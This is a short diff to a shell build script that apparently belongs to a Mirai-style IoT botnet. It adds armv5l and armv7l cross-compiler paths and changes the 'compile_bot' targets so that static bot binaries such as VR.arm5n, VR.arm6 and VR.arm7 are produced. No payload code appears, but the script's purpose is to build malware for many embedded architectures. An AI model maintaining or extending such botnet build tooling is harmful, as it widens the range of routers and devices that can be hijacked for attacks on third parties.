@@ -1,5 +1,7 @@
 export PATH=$PATH:/etc/xcompile/armv4l/bin
+export PATH=$PATH:/etc/xcompile/armv5l/bin
 export PATH=$PATH:/etc/xcompile/armv6l/bin
+export PATH=$PATH:/etc/xcompile/armv7l/bin
 export PATH=$PATH:/etc/xcompile/i586/bin
 export PATH=$PATH:/etc/xcompile/m68k/bin
 export PATH=$PATH:/etc/xcompile/mips/bin
@@ -37,8 +39,9 @@ compile_bot i586 VR.x86 "-static"
 compile_bot mips VR.mips "-static"
 compile_bot mipsel VR.mpsl "-static"
 compile_bot armv4l VR.arm "-static"
-compile_bot armv5l VR.arm5n
-compile_bot armv6l VR.arm7 "-static"
+compile_bot armv5l VR.arm5n "-static"
+compile_bot armv6l VR.arm6 "-static"
+compile_bot armv7l VR.arm7 "-static"
 compile_bot powerpc VR.ppc "-static"
 compile_bot sparc VR.spc "-static"
 compile_bot m68k VR.m68k "-static"
